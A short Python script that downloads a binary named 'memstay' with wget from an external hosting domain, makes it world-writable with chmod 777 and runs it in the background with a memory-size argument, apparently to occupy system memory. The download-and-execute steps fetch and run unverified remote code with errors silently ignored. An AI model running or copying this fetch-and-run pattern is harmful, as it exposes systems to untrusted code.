from os import system as send
import time,sys

def main(mem):
	print('Start')
	try:
		send('wget http://xownsla1.dothome.co.kr/tools/memstay')
	except:
		pass
	time.sleep(1)
	send('chmod 777 memstay')
	time.sleep(1)
	send('./memstay {} 1 10 &'.format(mem))
	print(mem)
	time.sleep(1)
	print('Finish')
	
if __name__ == '__main__':
	try:
		main(sys.argv[1])
	except:
		main(80)